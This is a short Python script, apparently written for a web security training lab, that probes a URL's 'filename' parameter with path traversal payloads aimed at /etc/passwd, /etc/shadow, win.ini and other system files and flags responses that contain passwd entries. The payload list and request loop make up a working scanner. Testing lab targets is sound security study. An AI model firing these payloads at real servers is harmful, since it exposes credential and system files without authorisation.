import requests

payloads = [
    "../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "../../../../../../../../windows/win.ini",
    "../../../../../../../../etc/shadow",
    "../../../../../../../../etc/group",
    "../../../../../../../../etc/hosts"
]

common_params = [
    "filename"
]

def check_path_traversal(base_url):
    """
    Checks for path traversal vulnerabilities on a given base URL.
    
    Args:
        base_url (str): The base URL to test for path traversal vulnerabilities.
    
    Returns:
        tuple: A tuple containing a boolean indicating if vulnerabilities were found and a description string.
    """
    results = []
    for param in common_params:
        for payload in payloads:
            # Construct the full URL
            test_url = f"{base_url}?{param}={payload}"
            print(f"Testing URL: {test_url}")

            try:
                response = requests.get(test_url, timeout=5)
                # Check for common indicators of path traversal vulnerability
                if "root:" in response.text or "daemon:" in response.text or "bin:" in response.text:
                    message = f"Path traversal vulnerability found with parameter '{param}' and payload: {payload}"
                    results.append(message)
                    print(message)
                    return True, "\n".join(results)
                else:
                    results.append(f"No vulnerability found with parameter '{param}' and payload: {payload}")
            except requests.exceptions.RequestException as e:
                results.append(f"Error testing URL: {test_url} - {e}")
    return False, "\n".join(results)

def scan_path(base_url):
    """
    Starts a scan for path traversal vulnerabilities on the given base URL.
    
    Args:
        base_url (str): The base URL to scan.
    
    Returns:
        tuple: A tuple containing a boolean indicating if vulnerabilities were found and a description string.
    """
    print(f"Starting scan on: {base_url}")
    return check_path_traversal(base_url)

if __name__ == "__main__":
    target_base_url = "https://0a1500ad0445100c8017f30400ea0041.web-security-academy.net/image"
    vulnerabilities_found, description = scan_path(target_base_url)
    print(description)
